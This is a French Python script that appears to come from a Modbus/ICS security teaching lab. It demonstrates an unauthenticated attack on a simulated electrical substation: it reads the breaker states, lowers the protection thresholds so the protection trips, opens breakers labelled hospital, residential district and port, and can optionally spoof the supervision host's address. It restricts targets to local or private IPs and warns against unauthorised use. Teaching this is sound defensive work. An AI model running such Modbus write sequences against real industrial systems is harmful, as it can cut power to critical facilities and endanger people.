"""
DÉMONSTRATION D'ATTAQUE · À N'UTILISER QUE DANS TON LABORATOIRE

Montre pourquoi Modbus sans protection est dangereux, en 3 étapes :
  1. reconnaissance : lire l'état du poste (aucun mot de passe n'est demandé) ;
  2. sabotage discret : abaisser les seuils de protection → la protection coupe tout ;
  3. coupure directe : ouvrir les 3 disjoncteurs d'un coup.

    python demonstration_attaque.py --labo                  (attaque directe sur l'automate, port 5021)
    python demonstration_attaque.py --labo --port 5020      (la même, à travers le pare-feu)
    python demonstration_attaque.py --labo --port 5020 --usurper   (en se faisant passer pour la supervision)

⚠️ Ce script refuse toute cible qui n'est pas sur ton propre ordinateur ou ton réseau local.
Viser un équipement qui ne t'appartient pas, sans autorisation écrite, est un délit.
"""
from __future__ import annotations

import argparse
import ipaddress
import sys

from client import ClientModbus
from modbus import ErreurModbus

DEPARTS = ["Hôpital", "Quartier résidentiel", "Zone portuaire"]


def cible_autorisee(hote: str) -> bool:
    """Seulement ton ordinateur (127.x) ou ton réseau privé (192.168.x, 10.x, 172.16-31.x)."""
    try:
        ip = ipaddress.ip_address(hote)
    except ValueError:
        return False  # pas de noms de domaine : on veut savoir exactement qui on vise
    return ip.is_loopback or ip.is_private


def etape(texte: str, action) -> None:
    print(f"\n▶ {texte}")
    try:
        resultat = action()
        print("  ✔ réussi" + (f" : {resultat}" if resultat is not None else ""))
    except ErreurModbus as e:
        print(f"  ✘ REFUSÉ par l'équipement (code d'exception {e.code})")


def main() -> None:
    p = argparse.ArgumentParser(description=__doc__, formatter_class=argparse.RawDescriptionHelpFormatter)
    p.add_argument("--labo", action="store_true", help="je confirme viser MON laboratoire")
    p.add_argument("--hote", default="127.0.0.1")
    p.add_argument("--port", type=int, default=5021)
    p.add_argument("--usurper", action="store_true", help="se connecter depuis l'adresse de la supervision (127.0.0.2)")
    a = p.parse_args()

    if not a.labo or not cible_autorisee(a.hote):
        sys.exit("Refusé : ajoute --labo, et vise uniquement ton ordinateur ou ton réseau local (adresse IP privée).")

    source = "127.0.0.2" if a.usurper else None
    print(f"Cible : {a.hote}:{a.port}" + (" (via le pare-feu)" if a.port == 5020 else " (automate en direct)")
          + (", en usurpant l'adresse de la supervision" if a.usurper else ""))
    c = ClientModbus(a.hote, a.port, source)

    etape("1. Reconnaissance : lire les disjoncteurs et les seuils",
          lambda: {d: f"{'fermé' if b else 'ouvert'}, seuil {s / 10:.0f} A"
                   for d, b, s in zip(DEPARTS, c.lire_bobines(0, 3), c.lire_registres(0, 3))})
    etape("2. Sabotage discret : seuils de protection à 1 A (la protection va tout couper)",
          lambda: c.ecrire_registres(0, [10, 10, 10]))
    etape("3. Coupure directe : ouvrir les 3 disjoncteurs d'un coup",
          lambda: c.ecrire_bobines(0, [0, 0, 0]))
    c.fermer()
    print("\nRegarde la supervision (http://127.0.0.1:8080) et le journal du pare-feu.")


if __name__ == "__main__":
    main()
